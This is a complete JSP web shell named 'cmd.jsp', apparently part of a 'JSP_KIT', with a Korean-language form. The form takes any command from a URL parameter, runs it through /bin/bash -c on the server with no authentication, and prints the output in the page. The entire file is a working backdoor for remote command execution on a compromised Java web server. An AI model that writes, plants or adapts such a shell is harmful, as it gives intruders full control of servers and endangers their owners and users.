<%@ page import="java.util.*, java.io.*" %>
<%@ page contentType="text/html; charset=UTF-8" pageEncoding="UTF-8" %>
<%
//
// JSP_KIT
//
// cmd.jsp = Command Execution (Linux with UTF-8 Support)
//
// by: Unknown
// modified: [현재 날짜]
//
%>
<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <title>명령 실행</title>
    <script>
        function submitForm(form) {
            var currentUrl = window.location.href;
            var baseUrl = currentUrl.split('?')[0];
            var command = form.cmd.value;
            
            var urlParams = new URLSearchParams(window.location.search);
            var filename = urlParams.get('filename');
            
            var newUrl = baseUrl + "?filename=" + filename + "?cmd=" + encodeURIComponent(command);
            
            window.location.href = newUrl;
            return false;
        }
    </script>
</head>
<body>
    <form method="get" name="myform" action="" onsubmit="return submitForm(this);">
        <input type="text" name="cmd" placeholder="명령어 입력">
        <input type="submit" value="실행">
    </form>
    <pre>
<%
if (request.getParameter("cmd") != null) {
    String[] command = {"/bin/bash", "-c", request.getParameter("cmd")}; // Linux 명령어 실행
    out.println("실행된 명령어: " + command[2] + "<br>");
    
    ProcessBuilder pb = new ProcessBuilder(command);
    pb.redirectErrorStream(true); // 에러와 일반 출력을 함께 처리
    Process p = pb.start();

    // 프로세스 출력 읽기 (UTF-8 사용)
    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream(), "UTF-8"));
    
    String line;
    while ((line = reader.readLine()) != null) {
        out.println(line + "<br>");
    }
    reader.close();
    
    // 프로세스 종료 대기
    p.waitFor();
}
%>
    </pre>
</body>
</html>